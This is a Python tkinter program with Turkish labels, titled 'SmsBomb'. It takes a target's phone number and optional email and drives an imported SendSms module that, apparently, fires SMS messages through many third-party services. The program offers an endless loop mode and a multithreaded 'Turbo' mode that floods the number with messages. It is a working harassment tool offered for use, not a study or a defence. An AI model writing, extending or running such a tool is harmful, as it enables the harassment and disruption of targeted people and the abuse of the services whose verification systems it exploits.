import tkinter as tk
from tkinter import messagebox
from time import sleep
import threading
from concurrent.futures import ThreadPoolExecutor, wait
from sms import SendSms

# SMS servislerinin listesi
servisler_sms = [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith('__')]

# Global değişkenler
stop_flag = False

# RGB Renk Değiştirme Fonksiyonu
def color_changer(label):
    colors = ["red", "orange", "yellow", "green", "cyan", "blue", "purple"]
    while True:
        for color in colors:
            label.config(fg=color)
            sleep(0.1)

# SMS Gönderme Fonksiyonları
def send_sms_normal(tel_liste, mail, kere, aralik):
    global stop_flag
    stop_flag = False
    while not stop_flag:
        for tel_no in tel_liste:
            sms = SendSms(tel_no, mail)
            if isinstance(kere, int):
                while sms.adet < kere and not stop_flag:
                    for attr in servisler_sms:
                        getattr(sms, attr)()
                        sleep(aralik)
            else:
                while not stop_flag:
                    for attr in servisler_sms:
                        getattr(sms, attr)()
                        sleep(aralik)

def send_sms_turbo(tel_no, mail):
    global stop_flag
    stop_flag = False
    send_sms = SendSms(tel_no, mail)
    try:
        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(getattr(send_sms, attr)) for attr in servisler_sms]
            wait(futures)
    except KeyboardInterrupt:
        messagebox.showinfo("Durum", "İşlem durduruldu.")

# SMS Gönderimini Durdur
def stop_sending():
    global stop_flag
    stop_flag = True
    messagebox.showinfo("Durum", "SMS gönderimi durduruldu.")

# Arayüz Fonksiyonları
def start_normal_sms():
    tel_no = tel_entry.get()
    mail = mail_entry.get()
    if len(tel_no) != 10 or not tel_no.isdigit():
        messagebox.showerror("Hata", "Geçersiz telefon numarası. Numara 10 haneli olmalıdır.")
        return

    try:
        kere = int(kere_entry.get()) if kere_entry.get() else None
    except ValueError:
        messagebox.showerror("Hata", "Geçersiz sayı girdiniz.")
        return

    try:
        aralik = int(aralik_entry.get())
    except ValueError:
        messagebox.showerror("Hata", "Geçersiz aralık değeri.")
        return

    tel_liste = [tel_no]
    threading.Thread(target=send_sms_normal, args=(tel_liste, mail, kere, aralik)).start()

def start_turbo_sms():
    tel_no = tel_entry.get()
    mail = mail_entry.get()
    if len(tel_no) != 10 or not tel_no.isdigit():
        messagebox.showerror("Hata", "Geçersiz telefon numarası. Numara 10 haneli olmalıdır.")
        return

    threading.Thread(target=send_sms_turbo, args=(tel_no, mail)).start()

# Ana Pencere
root = tk.Tk()
root.title(" SmsBomb")
root.geometry("500x600")
root.configure(bg="black")

# Başlık
title = tk.Label(root, text="SmsBomb", font=("Arial", 20), bg="black", fg="white")
title.pack(pady=10)

# Renk Değiştiren Yazı
rainbow_label = tk.Label(root, text="Infinitylink", font=("Arial", 17), bg="black")
rainbow_label.pack(pady=10)
threading.Thread(target=color_changer, args=(rainbow_label,)).start()

# Bilgilendirici Etiketler
info_label = tk.Label(root, text="Telefon numarasını başında '0' veya '+90' olmadan girin.\nÖrnek: 5555555555\nSonsuz SMS göndermek istiyorsanız\n'Kaç adet' alanını boş bırakın.", bg="black", fg="white")
info_label.pack(pady=10)

# Telefon Numarası Girdisi
tel_label = tk.Label(root, text="Telefon Numarası:", bg="black", fg="white")
tel_label.pack(pady=5)
tel_entry = tk.Entry(root)
tel_entry.pack(pady=5)

# Mail Adresi Girdisi (Opsiyonel)
mail_label = tk.Label(root, text="Mail Adresi (Opsiyonel):", bg="black", fg="white")
mail_label.pack(pady=5)
mail_entry = tk.Entry(root)
mail_entry.pack(pady=5)

# Kaç Kere Girdisi
kere_label = tk.Label(root, text="Kaç Adet (opsiyonel):", bg="black", fg="white")
kere_label.pack(pady=5)
kere_entry = tk.Entry(root)
kere_entry.pack(pady=5)

# Aralık Girdisi
aralik_label = tk.Label(root, text="Aralık (saniye(Yazmak zorunlu):", bg="black", fg="white")
aralik_label.pack(pady=5)
aralik_entry = tk.Entry(root)
aralik_entry.pack(pady=5)

# SMS Gönderme Butonları
normal_button = tk.Button(root, text="Normal SMS Gönder", command=start_normal_sms)
normal_button.pack(pady=10)

turbo_button = tk.Button(root, text="Turbo SMS Gönder", command=start_turbo_sms)
turbo_button.pack(pady=10)

# Durdur Butonu
stop_button = tk.Button(root, text="Durdur", command=stop_sending)
stop_button.pack(pady=10)

# Ana döngüyü çalıştır
root.mainloop()